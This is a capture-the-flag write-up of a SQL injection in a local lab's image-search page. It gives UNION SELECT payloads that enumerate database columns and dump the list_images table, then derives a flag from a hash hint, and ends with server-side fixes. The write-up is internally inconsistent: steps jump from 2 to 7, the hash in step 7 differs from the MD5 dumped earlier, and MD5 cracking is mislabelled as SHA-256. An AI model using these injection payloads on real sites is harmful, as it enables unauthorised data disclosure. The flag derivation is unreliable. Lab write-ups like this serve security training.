# SQL Injection (searchimg)

**One‑liner:** The image search feature concatenates user input into a SQL query. With `UNION SELECT` we enumerate `list_images` and read a hint containing an MD5; cracking it then lowercasing and hashing with SHA‑256 yields the flag.

---

## Where

* **URL:** `http://127.0.0.1:8080/?page=searchimg`
* **Param:** (input field on the page; injected into SQL)
* **Auth:** none

---

## How to reproduce (paste directly into the input)

1. **List table columns** of `list_images` (hex to avoid quotes)

```
-1 UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x6C6973745F696D61676573 --
```

**Observed:**

```
id,url,title,comment
```

2. **Dump rows** (compact per row)

```
-1 UNION SELECT 1,CONCAT(id,0x3a,url,0x3a,title,0x3a,comment) FROM list_images --
```

**Observed samples:**

```
1:https://fr.wikipedia.org/wiki/Programme_:Nsa:An image about the NSA !
2:https://fr.wikipedia.org/wiki/Fichier:42:42 !:There is a number..
3:https://fr.wikipedia.org/wiki/Logo_de_Go:Google:Google it !
4:https://en.wikipedia.org/wiki/Earth#/med:Earth:Earth!
5:borntosec.ddns.net/images.png:Hack me ?:If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

7. **Ciphertext decryption**

```
5ff9d0165b4f92b14994e5c685cdce28 -> (decypher SHA-256) albatroz -> (cypher SHA-256) f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
---

## Impact

* Enumerate arbitrary tables/columns and leak data.
* In this lab, recover an MD5 hint and derive the **final flag** by simple cryptographic processing.

**Severity:** Critical (no auth, trivial exploitation, data disclosure).

---

## Fix (server‑side — mandatory)

1. **Prepared statements** with bound parameters for the search term.
2. **Whitelist** which columns can be searched; do not concatenate raw input into SQL.
3. **Escape/encode output** before rendering to avoid secondary issues (XSS).
4. **Least‑privilege** DB account; generic error messages (log server‑side).

---

## References

* OWASP Cheat Sheet: **SQL Injection Prevention**
* CWE‑89: **SQL Injection**
